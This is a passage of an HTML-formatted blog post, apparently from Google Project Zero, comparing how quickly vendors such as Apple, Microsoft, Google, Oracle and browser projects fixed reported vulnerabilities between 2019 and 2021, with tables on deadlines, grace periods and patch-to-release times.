(0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;46&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Samsung&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;8 (80%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;2 (20%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Oracle&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;3 (43%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;0 (0%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;4 (57%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;109&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span&gt;Others&lt;/span&gt;&lt;span class="c4"&gt;*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;55&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;48 (87%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;3 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;4 (7%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;44&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c23" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;TOTAL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c10" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;346&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c12" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;294 (84%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;34 (10%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c14" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;18 (5%)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c16" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;61&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c8"&gt;&lt;span class="c22"&gt;* For completeness, the vendors included in the &amp;quot;Others&amp;quot; bucket are Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Node.js, opencontainers, QT, Qualcomm, RedHat, Reliance, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c37 c42"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Overall, the data show that almost all of the big vendors here are coming in under 90 days, on average. The bulk of fixes during a grace period come from Apple and Microsoft (22 out of 34 total).&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Vendors have exceeded the deadline and grace period about 5% of the time over this period. In this slice, Oracle has exceeded at the highest rate, but admittedly with a relatively small sample size of only about 7 bugs. The next-highest rate is Microsoft, having exceeded 4 of their 80 deadlines.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;Average number of days to fix bugs across all vendors is 61 days. Zooming in on just that stat, we can break it out by year:&lt;/span&gt;&lt;/p&gt; &lt;p class="c9 c35"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h3 class="c11" id="h.vez2bf9dw4kq"&gt;&lt;span&gt;Bug fix time 2019-2021, by bug report volume&lt;/span&gt;&lt;/h3&gt;&lt;a id="t.0f46d6ef5bbf669008817a45d8194292e813c307"&gt;&lt;/a&gt;&lt;a id="t.1"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c26 c7"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Bugs in 2019&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c7 c26"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Bugs in 2020&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Bugs in 2021&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;(avg days to fix)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Apple&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;61 (71)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;13 (63)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;11 (64)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Microsoft&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;46 (85)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;18 (87)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;16 (76)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Google&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;26 (49)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;13 (22)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;17 (53)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Linux&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;12 (32)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;8 (22)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;5 (15)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Others*&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;54 (63)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;35 (54)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;14 (29)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c24"&gt;&lt;td class="c3" colspan="1" rowspan="1"&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;TOTAL&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c25" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;199 (67)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;87 (54)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c5" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;63 (52)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c8"&gt;&lt;span class="c37 c39"&gt;* For completeness, the vendors included in the &amp;quot;Others&amp;quot; bucket are Adobe, Apache, ASWF, Avast, AWS, c-ares, Canonical, F5, Facebook, git, Github, glibc, gnupg, gnutls, gstreamer, haproxy, Hashicorp, insidesecure, Intel, Kubernetes, libseccomp, libx264, Logmein, Mozilla, Node.js, opencontainers, Oracle, QT, Qualcomm, RedHat, Reliance, Samsung, SCTPLabs, Signal, systemd, Tencent, Tor, udisks, usrsctp, Vandyke, VietTel, webrtc, and Zoom.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;From this, we can see a few things: first of all, the overall time to fix has consistently been decreasing, but most significantly between 2019 and 2020. Microsoft, Apple, and Linux overall have reduced their time to fix during the period, whereas Google sped up in 2020 before slowing down again in 2021. Perhaps most impressively, the others not represented on the chart have collectively cut their time to fix in more than half, though it&amp;#39;s possible this represents a change in research targets rather than a change in practices for any particular vendor.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Finally, focusing on just 2021, we see:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c41 lst-kix_9x4uh3knfz5m-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span&gt;Only &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://bugs.chromium.org/p/project-zero/issues/list?colspec=ID%20Status%20Restrict%20Finder%20Reported%20Deadline%20Remaining%20CVE%20Vendor%20Product%20Summary&amp;q=id%3E%3D2137%20Deadline%3DExceeded%20-Deadline-Grace&amp;can=1"&gt;1 deadline exceeded&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;, versus an average of 9 per year in the other two years&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c8 c30 li-bullet-0"&gt;&lt;span class="c4"&gt;The grace period used 9 times (notably with half being by Microsoft), versus the slightly lower average of 12.5 in the other years&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h1 class="c29" id="h.wdfygamerb2l"&gt;&lt;span class="c31"&gt;Mobile phones&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;Since the products in the previous table span a range of types (desktop operating systems, mobile operating systems, browsers), we can also focus on a particular, hopefully more apples-to-apples comparison: mobile phone operating systems. &lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.db6b038cf533045efa428ca3d33366f0e9985107"&gt;&lt;/a&gt;&lt;a id="t.2"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c18"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c26 c7"&gt;Vendor&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c26 c7"&gt;Total bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c26 c7"&gt;Avg fix time&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;iOS&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;76&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;70&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Android (Samsung)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;10&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c28" colspan="1" rowspan="1"&gt; &lt;p class="c9"&gt;&lt;span class="c4"&gt;Android (Pixel)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c15" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c4"&gt;72&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;The first thing to note is that it appears that iOS received remarkably more bug reports from Project Zero than any flavor of Android did during this time period, but rather than an imbalance in research target selection, this is more a reflection of how Apple ships software. Security updates for &amp;quot;apps&amp;quot; such as iMessage, Facetime, and Safari/WebKit are all shipped as part of the OS updates, so we include those in the analysis of the operating system. On the other hand, security updates for standalone apps on Android happen through the Google Play Store, so they are not included here in this analysis.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span&gt;Despite that, all three vendors have an extraordinarily similar average time to fix. &lt;/span&gt;&lt;span&gt;With the data we have available, it&amp;#39;s hard to determine how much time is spent on each part of the vulnerability lifecycle (e.g. triage, patch authoring, testing, etc).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, open-source products do provide a window into where time is spent.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.4ajnbffcm6lj"&gt;&lt;span class="c31"&gt;Browsers&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span&gt;For most software, we aren&amp;#39;t able to dig into specifics of the timeline. Specifically: after a vendor receives a report of a security issue, how much of the &amp;quot;time to fix&amp;quot; is spent between the bug report and &lt;/span&gt;&lt;span&gt;landing the fix&lt;/span&gt;&lt;span class="c4"&gt;, and how much time is spent between landing that fix and releasing a build with the fix? The one window we do have is into open-source software, and specific to the type of vulnerability research that Project Zero does, open-source browsers.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c7"&gt;Fix time analysis for open-source browsers&lt;/span&gt;&lt;span class="c7"&gt;, by bug volume&lt;/span&gt;&lt;/p&gt;&lt;a id="t.9206b02c8834a0124a61f8895479290be80060e3"&gt;&lt;/a&gt;&lt;a id="t.3"&gt;&lt;/a&gt;&lt;table class="c13"&gt;&lt;tbody&gt;&lt;tr class="c36"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c27"&gt;&lt;span class="c26 c7"&gt;Browser&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Bugs&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c7"&gt;Avg days from bug report to &lt;/span&gt;&lt;span class="c7"&gt;public patch&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Avg days from public patch to release&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c26 c7"&gt;Avg days from bug report to release&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c27"&gt;&lt;span class="c4"&gt;Chrome&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;40&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;5.3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;24.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;29.9&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c27"&gt;&lt;span class="c4"&gt;WebKit&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;27&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;11.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;61.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;72.7&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c40"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c27"&gt;&lt;span class="c4"&gt;Firefox&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;16.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;21.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;37.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="c18"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c27"&gt;&lt;span class="c4"&gt;Total&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c32" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;75&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c6" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;8.8&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span class="c4"&gt;37.3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class="c21" colspan="1" rowspan="1"&gt; &lt;p class="c0"&gt;&lt;span&gt;46.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;We can also take a look at the same data, but with each bug spread out in a histogram. In particular, the histogram of the amount of time from a fix being landed in public to that fix being shipped to users shows a clear story (in the table above, this corresponds to &amp;quot;Avg days from public patch to release&amp;quot; column:&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;&lt;a href="https://blogger.googleusercontent.com/img/a/AVvXsEjfS0R9o3QylkBNHZbNj2pMaBXdFVRkr-uLDOJwOOT9Pn1UcDvnmCtqVSnW07GnHn6egWc5vSOcCzYosmhvtIo2XBsOkJtXQAGLkloOlMweBEthnKEbqJtAbqRvK8dl_CJisoyAYdNC0IN52_bwbFxOFvqHhzqj36tF-iWIP3_KNUO7xdvBtNojGfdxfw=s1226" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/a/AVvXsEjfS0R9o3QylkBNHZbNj2pMaBXdFVRkr-uLDOJwOOT9Pn1UcDvnmCtqVSnW07GnHn6egWc5vSOcCzYosmhvtIo2XBsOkJtXQAGLkloOlMweBEthnKEbqJtAbqRvK8dl_CJisoyAYdNC0IN52_bwbFxOFvqHhzqj36tF-iWIP3_KNUO7xdvBtNojGfdxfw=s1226" border="0" alt="Histogram showing the distributions of time from a fix landing in public to a fix shipping for Firefox, Webkit, and Chrome. The fact that Webkit is still on the higher end of the histogram tells us that most of their time is spent shipping the fixed build after the fix has landed." style="max-height: 750px; max-width: 600px;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c4"&gt;The table and chart together tell us a few things:&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c7"&gt;Chrome is currently the fastest of the three browsers, with time from bug report to releasing a fix in the stable channel in 30 days&lt;/span&gt;&lt;span&gt;. The time to patch is very fast here, with just an average of 5 days between the bug report and the patch landing in public. The time for that patch to be released to the public is the bulk of the overall time window, though overall we still see the Chrome (blue) bars of the histogram toward the left side of the histogram. (Important note: despite being housed within the same company, &lt;/span&gt;&lt;span&gt;Project Zero&lt;/span&gt;&lt;span&gt;&amp;nbsp;follows the same policies and procedures with Chrome that an external security researcher would follow. More information on that is available in our &lt;/span&gt;&lt;span class="c17"&gt;&lt;a class="c201" href="https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html#earlyaccess"&gt;Vulnerability Disclosure FAQ&lt;/a&gt;&lt;/span&gt;&lt;span class="c4"&gt;.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c7"&gt;Firefox comes in second in this analysis, though with a relatively small number of data points to analyze. Firefox releases a fix on average in 38 days&lt;/span&gt;&lt;span class="c4"&gt;. A little under half of that is time for the fix to land in public, though it&amp;#39;s important to note that Firefox intentionally delays committing security patches to reduce the amount of exposure before the fix is released. Once the patch has been made public, it releases the fixed build on average a few days faster than Chrome &amp;ndash; with the vast majority of the fixes shipping 10-15 days after their public patch.&lt;/span&gt;&lt;/p&gt; &lt;p class="c2"&gt;&lt;span class="c4"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c8"&gt;&lt;span class="c7"&gt;WebKit is the outlier in this analysis, with the longest number of days to release a patch at 73 days&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;Their time to land the fix publicly is in the middle between Chrome and Firefox, but unfortunately this leaves a very long amount of time for opportunistic attackers to find the patch and exploit it prior to the fix being made available to users. This can be seen by the Apple (red) bars of the second histogram mostly being on the right side of the graph, and every one of them except one being past the 30-day mark. &lt;/span&gt;&lt;/p&gt;&lt;h1 class="c29" id="h.bghb183lyinq"&gt;&lt;span class="c31"&gt;Analysis, hopes, and dreams&lt;/span&gt;&lt;/h1&gt; &lt;p class="c8"&gt;&lt;span&gt;Overall, we see a number of promising trends emerging from the data. Vendors are fixing almost all of the bugs that they receive, and they generally do it within the 90-day deadline plus the 14-day grace period when needed.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Over the past three years vendors have, for the most part, &lt;/span&gt;&lt;span&gt;accelerated&lt;/span&gt;&lt;span class="c4"&gt;&amp;nbsp;their patch effectively reducing the overall average time to fix to about 52 days. In 2021, there was only one 90-day deadline exceeded. We suspect that this trend may be due to the fact that responsible disclosure policies have become the de-facto standard in the industry, and vendors are more equipped to react rapidly to reports with differing deadlines. We also suspect that vendors have learned best practices from each other, as there has been increasing transparency in 